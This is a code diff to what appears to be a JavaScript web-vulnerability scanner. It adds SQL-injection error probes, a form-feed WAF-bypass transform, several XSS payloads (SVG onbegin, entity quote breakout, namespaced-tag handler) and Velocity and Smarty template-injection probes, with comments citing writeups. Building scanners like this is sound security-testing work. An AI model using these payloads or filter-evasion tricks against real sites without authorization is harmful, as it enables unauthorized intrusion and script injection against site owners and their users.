@@ -12,6 +12,10 @@ const ERROR_PROBES = [
   "' OR '1'='1", '" OR "1"="1', "' OR 1=1-- -",
   // community 2026-09: auth-bypass tautology w/ row cap (HackerDNA lab writeup)
   "' OR 1=1 limit 1-- ",
+  // community 2026-10-05: lone backslash — escapes the app's own closing
+  // quote on backslash-escaping sanitizers (Roundcube CVE-2026-48842 writeup,
+  // Sep 2026), reopening the string → DBMS syntax error.
+  "\\",
 ];
 
 const BOOLEAN_PAIRS = [
@@ -96,6 +100,10 @@ const TRANSFORMS = {
     const dec = (s) => [...s].map((c) => `&#${c.charCodeAt(0)};`).join("");
     return p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => dec(m));
   },
+  // community 2026-10-05: form-feed whitespace (WAF-bypass skill roundups,
+  // Sep 2026) — \x0c is valid SQL whitespace in MySQL/PostgreSQL, but regex
+  // WAFs that only allow [ \t\n] miss it.
+  ffspace: (p) => p.replace(/ /g, "\x0c"),
 };
 
 const LEVEL_TRANSFORMS = {
@@ -103,7 +111,7 @@ const LEVEL_TRANSFORMS = {
   2: ["randomcase", "space2comment", "tabspace", "charencode"],
   3: ["randomcase", "space2comment", "tabspace", "newlinespace", "charencode",
       "doubleencode", "versioned-comments", "nullbyte", "keyword-split",
-      "jsonwrap", "xmlentities", "xmlentities-dec"],
+      "jsonwrap", "xmlentities", "xmlentities-dec", "ffspace"],
 };
 
 /* encodeURIComponent that preserves intentional %XX sequences from transforms */
@@ -152,9 +160,20 @@ const XSS_PROBES = [
   // <noscript> mutation XSS: parser keeps the <p> inert until </noscript>, so
   // the trailing <img onerror> becomes a live element (SafePaste mXSS writeup).
   { name: "mxss-noscript", t: '<noscript><p title="x</noscript><img src=x onerror={C}>', kinds: ["tag"] },
+  // --- community additions 2026-10-05 (web-indexed writeup roundup) ---
+  // SVG <animatetransform onbegin>: animation-event vector that fires even
+  // where onload/onclick handlers are filtered (PortSwigger lab writeup).
+  { name: "svg-animatetransform", t: "<svg><animatetransform onbegin={C} attributeName=transform>", kinds: ["tag"] },
+  // HTML-entity quote breakout for JS-string contexts: &apos; decodes in the
+  // browser after server-side backslash escaping has already run
+  // (PortSwigger lab writeup).
+  { name: "js-apos-entity", t: "&apos;);{C}//", kinds: ["js"] },
+  // Namespaced/custom element: slips past sanitizers that only strip known
+  // tags, keeping the event handler live (SunEditor CVE-2026-59167 writeup).
+  { name: "namespaced-tag", t: '<a:b src="/x" onclick={C}>click</a:b>', kinds: ["tag"] },
 ];
 
-const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 29 };
+const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 32 };
 
 /* ------------------------------------------------------------------ */
 /* SSTI — distinctive-math probes (detection only)                     */
@@ -175,6 +194,10 @@ const SSTI_PROBES = [
   // templates per Nullcon 2026 research) — reuses SSTI_EXPECTED, so no
   // background.js change is needed.
   `{% if ${SSTI_FACTOR_A}*${SSTI_FACTOR_B}==${SSTI_EXPECTED} %}${SSTI_EXPECTED}{% endif %}`,
+  // community 2026-10-05: two more engines — both yield SSTI_EXPECTED,
+  // so no background.js change is needed.
+  `#set($aegis=${SSTI_FACTOR_A}*${SSTI_FACTOR_B})$aegis`, // Apache Velocity
+  `{if ${SSTI_FACTOR_A}*${SSTI_FACTOR_B}==${SSTI_EXPECTED}}${SSTI_EXPECTED}{/if}`, // Smarty3
 ];
 
 /* ------------------------------------------------------------------ */
